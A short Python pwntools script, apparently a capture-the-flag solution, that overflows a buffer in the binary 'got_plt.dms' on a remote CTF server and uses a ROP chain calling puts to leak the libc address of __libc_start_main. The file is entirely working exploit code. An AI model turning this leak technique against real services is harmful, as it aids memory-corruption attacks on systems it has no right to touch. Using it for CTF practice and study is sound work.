# !/usr/bin/python

from pwn import *
from pwnlib import *

e = ELF('./got_plt.dms')
rop = ROP(e)
# print hex(e.symbols['setvbuf'])
# print hex(e.symbols['puts'])
# print hex(e.symbols['gets'])
# print hex(e.symbols['main'])
SETVBUF = 0x804c018
PUTS = e.plt['puts']
puts_not_plt = 0x804C010
GETS = 0x804C00C
LIBC_START_MAIN = 0x804C014
POP_EBX = (rop.find_gadget(['pop ebx', 'ret']))[0] # 0x08049022

# print('[*] SYMBOL/PLT'
# print hex(PUTS)
# print hex(LIBC_START_MAIN)
# print hex(POP_EBX)

# print '[*] GOT'
# print hex(e.got['setvbuf'])
# print hex(e.got['puts'])
# print hex(e.got['gets'])

pad = b"A"*16
pad += b'BBBB'


rop = pad + p32(PUTS) + p32(POP_EBX) + p32(LIBC_START_MAIN)

# with open('payload', 'w') as outfile:
#     outfile.write(rop)

r = remote('ctf99.cs.ui.ac.id', 9130)
# r = process('./got_plt.dms')
context.binary = './got_plt.dms'

r.sendlineafter('gets', rop)

r.recvline()
r.recvline()
r.recvline()
r.recvline()
recieved = r.recvline().strip()
# print len(recieved)
leak  = hex(u32(recieved[:4].ljust(4, b'\x00')))
print("__libc_start_main: %s" % (leak))
# pause()

# r.interactive()
#libc 0xf7516660
#puts 0xf762a470
#gets 0xf7579b50
#setvbuf 0xf75cdad0
r.close()